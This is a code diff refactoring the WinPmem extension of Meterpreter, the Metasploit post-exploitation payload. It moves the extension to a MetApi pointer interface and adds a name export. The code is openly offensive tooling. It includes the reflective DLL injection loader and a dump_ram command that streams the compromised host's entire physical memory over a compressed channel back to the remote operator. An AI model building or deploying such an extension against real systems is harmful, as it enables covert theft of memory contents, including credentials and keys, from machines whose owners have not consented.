@@ -1,21 +1,17 @@
 #define DEBUGTRACE 1
-extern "C"{
+extern "C" {
 	/*!
 	 * @file WINPMEM.cpp
 	 * @brief Entry point and intialisation functionality for the WINPMEM extention.
 	 */
-#include "../../common/common.h"
-
-#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
-	// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
-	// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
-	// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
+#include "common.h"
+#include "common_metapi.h"
 #include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
-	// this sets the delay load hook function, see DelayLoadMetSrv.h
-	EnableDelayLoadMetSrv();
+	// Required so that use of the API works.
+	MetApi* met_api = NULL;
 
-	DWORD dump_ram(Remote *remote, Packet *packet);
+	DWORD dump_ram(Remote* remote, Packet* packet);
 
 	Command customCommands[] =
 	{
@@ -24,24 +20,41 @@ extern "C"{
 	};
 
 	/*!
-	* @brief Initialize the server extension
-	*/
-	DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
+	 * @brief Initialize the server extension.
+	 * @param api Pointer to the Meterpreter API structure.
+	 * @param remote Pointer to the remote instance.
+	 * @return Indication of success or failure.
+	 */
+	DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
 	{
-		hMetSrv = remote->met_srv;
+		met_api = api;
 
-		command_register_all(customCommands);
+		met_api->command.register_all(customCommands);
 
 		return ERROR_SUCCESS;
 	}
 
 	/*!
-	* @brief Deinitialize the server extension
-	*/
-	DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
+	 * @brief Deinitialize the server extension.
+	 * @param remote Pointer to the remote instance.
+	 * @return Indication of success or failure.
+	 */
+	DWORD __declspec(dllexport) DeinitServerExtension(Remote* remote)
 	{
-		command_deregister_all(customCommands);
+		met_api->command.deregister_all(customCommands);
 
+		return ERROR_SUCCESS;
+	}
+
+	/*!
+	 * @brief Get the name of the extension.
+	 * @param buffer Pointer to the buffer to write the name to.
+	 * @param bufferSize Size of the \c buffer parameter.
+	 * @return Indication of success or failure.
+	 */
+	DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
+	{
+		strncpy_s(buffer, bufferSize, "winpmem", bufferSize - 1);
 		return ERROR_SUCCESS;
 	}
 }
@@ -180,7 +193,7 @@ WinPmem_meterpreter *WinPmemFactory()
 
 DWORD dump_ram(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD result;
 	result = WINPMEM_ERROR_UNKNOWN;
 	__int64 status;
@@ -241,7 +254,7 @@ DWORD dump_ram(Remote *remote, Packet *packet)
 	chops.read = winpmem_channel_read;
 	chops.eof = winpmem_channel_eof;
 
-	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS, &chops)))
+	if (!(newChannel = met_api->channel.create_pool(0, CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS, &chops)))
 	{
 		result = WINPMEM_ERROR_UNKNOWN;
 		dprintf("[WINPMEM] Failed to get Meterpreter Channel");
@@ -249,12 +262,12 @@ DWORD dump_ram(Remote *remote, Packet *packet)
 		goto end;
 	}
 
-	channel_set_type(newChannel, "winpmem");
-	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
-	packet_add_tlv_qword(response, TLV_TYPE_WINPMEM_MEMORY_SIZE, pmem_handle->get_max_physical_memory());
+	met_api->channel.set_type(newChannel, "winpmem");
+	met_api->packet.add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, met_api->channel.get_id(newChannel));
+	met_api->packet.add_tlv_qword(response, TLV_TYPE_WINPMEM_MEMORY_SIZE, pmem_handle->get_max_physical_memory());
 end:
-	packet_add_tlv_uint(response, TLV_TYPE_WINPMEM_ERROR_CODE, result);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_uint(response, TLV_TYPE_WINPMEM_ERROR_CODE, result);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 	return ERROR_SUCCESS;
 }
 
